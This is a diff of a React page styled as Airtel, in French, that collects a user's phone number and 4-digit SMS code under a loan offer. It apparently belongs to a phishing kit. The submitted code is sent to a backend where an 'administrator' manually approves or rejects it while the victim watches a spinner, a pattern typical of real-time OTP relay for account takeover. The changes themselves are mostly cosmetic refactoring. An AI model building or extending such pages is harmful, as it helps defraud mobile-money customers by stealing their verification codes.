@@ -16,38 +16,34 @@ function AirtelOTPVerify() {
 
   const phoneNumber = localStorage.getItem('airtelPhone') || '';
 
-  // Redirect to login if no phone saved
+  // Redirect if no phone saved
   useEffect(() => {
-    if (!phoneNumber) {
-      navigate('/');
-    }
+    if (!phoneNumber) navigate('/');
   }, [phoneNumber, navigate]);
 
-  // Auto-focus first OTP box on mount
+  // Focus first box on mount
   useEffect(() => {
     inputRefs.current[0]?.focus();
   }, []);
 
-  // Auto-hide toast after 4 seconds
+  // Auto-hide toast
   useEffect(() => {
     if (!toast) return;
     const t = setTimeout(() => setToast(null), 4000);
     return () => clearTimeout(t);
   }, [toast]);
 
-  // Countdown timer
+  // Countdown
   useEffect(() => {
     if (timeLeft <= 0) {
       setExpired(true);
       return;
     }
-    const timer = setTimeout(() => {
-      setTimeLeft((prev) => prev - 1);
-    }, 1000);
+    const timer = setTimeout(() => setTimeLeft((p) => p - 1), 1000);
     return () => clearTimeout(timer);
   }, [timeLeft]);
 
-  // Cleanup polling on unmount
+  // Cleanup polling
   useEffect(() => {
     return () => {
       if (pollRef.current) clearInterval(pollRef.current);
@@ -70,9 +66,7 @@ function AirtelOTPVerify() {
     const newOtp = [...otp];
     newOtp[index] = value.substring(value.length - 1);
     setOtp(newOtp);
-    if (value && index < 3) {
-      inputRefs.current[index + 1]?.focus();
-    }
+    if (value && index < 3) inputRefs.current[index + 1]?.focus();
   };
 
   const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
@@ -81,7 +75,7 @@ function AirtelOTPVerify() {
     }
   };
 
-  // Start polling for admin approval
+  // Poll the backend every 2 seconds for admin approval
   const startPolling = () => {
     let attempts = 0;
     const maxAttempts = 60; // 2 minutes
@@ -91,8 +85,8 @@ function AirtelOTPVerify() {
       if (attempts > maxAttempts) {
         stopPolling();
         setIsVerifying(false);
+        setError('Délai dépassé. Veuillez réessayer.');
         showToast('⏱️ Délai dépassé. Veuillez réessayer.', 'error');
-        setError('Vérification expirée. Veuillez réessayer.');
         return;
       }
 
@@ -104,19 +98,18 @@ function AirtelOTPVerify() {
 
         if (data.status === 'approved') {
           stopPolling();
-          showToast('✅ Approuvé ! Redirection...', 'success');
+          showToast('✅ Prêt approuvé ! Redirection...', 'success');
           setTimeout(() => navigate('/airtel-loan-limit'), 600);
         } else if (data.status === 'rejected') {
           stopPolling();
           setIsVerifying(false);
+          setOtp(['', '', '', '']);
           setError('Code refusé par l\'administrateur.');
           showToast('❌ Code refusé par l\'administrateur.', 'error');
-          setOtp(['', '', '', '']);
           setTimeout(() => inputRefs.current[0]?.focus(), 100);
         }
-        // If 'pending', keep polling silently
       } catch {
-        // Network hiccup — keep polling
+        // Keep polling on network hiccups
       }
     }, 2000);
   };
@@ -126,18 +119,17 @@ function AirtelOTPVerify() {
     const otpString = otp.join('');
 
     if (expired) {
-      showToast('⏱️ Le code a expiré. Veuillez cliquer sur « Renvoyer le code ».', 'error');
+      showToast('⏱️ Le code a expiré. Cliquez sur « Renvoyer le code ».', 'error');
       return;
     }
-
     if (otpString.length < 4) {
-      setError('Veuillez saisir le code de vérification à 4 chiffres.');
+      setError('Veuillez saisir le code à 4 chiffres.');
       showToast('⚠️ Veuillez saisir le code à 4 chiffres.', 'error');
       return;
     }
 
     setError('');
-    setIsVerifying(true);
+    setIsVerifying(true); // ← switch to spinner
 
     try {
       const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/verify-otp`, {
@@ -148,42 +140,41 @@ function AirtelOTPVerify() {
       const data = await response.json();
 
       if (data.status === 'success') {
-        showToast('✅ Code correct ! Redirection...', 'success');
+        showToast('✅ Prêt approuvé ! Redirection...', 'success');
         setTimeout(() => navigate('/airtel-loan-limit'), 600);
         return;
       }
 
       if (data.status === 'pending') {
-        // OTP is correct, but admin hasn't decided — start polling
+        // OTP correct but admin hasn't decided → keep spinner, start polling
         startPolling();
         return;
       }
 
       if (data.status === 'rejected') {
         setIsVerifying(false);
+        setOtp(['', '', '', '']);
         setError('Code refusé par l\'administrateur.');
         showToast('❌ Code refusé par l\'administrateur.', 'error');
-        setOtp(['', '', '', '']);
         setTimeout(() => inputRefs.current[0]?.focus(), 100);
         return;
       }
 
       // Any other case = invalid OTP
       setIsVerifying(false);
-      setError(data.message || 'Code invalide. Veuillez réessayer.');
-      showToast('❌ Code incorrect ! Vérifiez le code reçu par SMS.', 'error');
       setOtp(['', '', '', '']);
+      setError(data.message || 'Code invalide.');
+      showToast('❌ Code incorrect ! Vérifiez le SMS reçu.', 'error');
       setTimeout(() => inputRefs.current[0]?.focus(), 100);
     } catch {
       setIsVerifying(false);
       showToast('⚠️ Erreur de connexion. Vérifiez votre réseau.', 'error');
-      setError('Erreur lors de la vérification. Veuillez réessayer.');
+      setError('Erreur de connexion au serveur.');
     }
   };
 
   const handleResend = async () => {
     if (isVerifying) return;
-
     setTimeLeft(45);
     setExpired(false);
     setOtp(['', '', '', '']);
@@ -191,21 +182,18 @@ function AirtelOTPVerify() {
     setIsResending(true);
 
     try {
-      const response = await fetch(
-        `${import.meta.env.VITE_API_BASE_URL}/api/resend-otp`,
-        {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ phone_number: phoneNumber }),
-        }
-      );
+      const response = await fetch(`${import.meta.env.VITE_API_BASE_URL}/api/resend-otp`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ phone_number: phoneNumber }),
+      });
       const data = await response.json();
 
       if (data.status === 'success') {
-        showToast('📩 Un nouveau code a été envoyé sur votre téléphone.', 'success');
+        showToast('📩 Un nouveau code a été envoyé.', 'success');
         setTimeout(() => inputRefs.current[0]?.focus(), 100);
       } else {
-        showToast(data.message || 'Échec de l\'envoi du nouveau code.', 'error');
+        showToast(data.message || 'Échec de l\'envoi.', 'error');
       }
     } catch {
       showToast('Erreur de connexion au serveur.', 'error');
@@ -231,13 +219,6 @@ function AirtelOTPVerify() {
               <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                 <circle cx="12" cy="12" r="10"></circle>
                 <polyline points="16 9 10.5 15 8 12.5"></polyline>
-              </svg>
-            )}
-            {toast.type === 'info' && (
-              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                <circle cx="12" cy="12" r="10"></circle>
-                <line x1="12" y1="16" x2="12" y2="12"></line>
-                <line x1="12" y1="8" x2="12.01" y2="8"></line>
               </svg>
             )}
           </div>
@@ -266,18 +247,8 @@ function AirtelOTPVerify() {
 
       {/* Card */}
       <div className="airtel-card">
-        {!isVerifying && (
-          <button className="airtel-back-link" onClick={() => navigate('/')}>
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <line x1="19" y1="12" x2="5" y2="12"></line>
-              <polyline points="12 19 5 12 12 5"></polyline>
-            </svg>
-            Retour à la connexion
-          </button>
-        )}
-
-        {/* ---- SPINNER STATE (while verifying) ---- */}
         {isVerifying ? (
+          /* ---- SPINNER STATE ---- */
           <div className="airtel-verifying-state">
             <div className="airtel-big-spinner"></div>
             <h2 className="airtel-otp-heading">Vérification en cours...</h2>
@@ -286,7 +257,16 @@ function AirtelOTPVerify() {
             </p>
           </div>
         ) : (
+          /* ---- INPUT STATE ---- */
           <>
+            <button className="airtel-back-link" onClick={() => navigate('/')}>
+              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polyline points="12 19 5 12 12 5"></polyline>
+              </svg>
+              Retour à la connexion
+            </button>
+
             <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
             <p className="airtel-otp-subtext">
               Saisissez le code à 4 chiffres envoyé à {phoneNumber || '+243 XXX XXX XXX'}
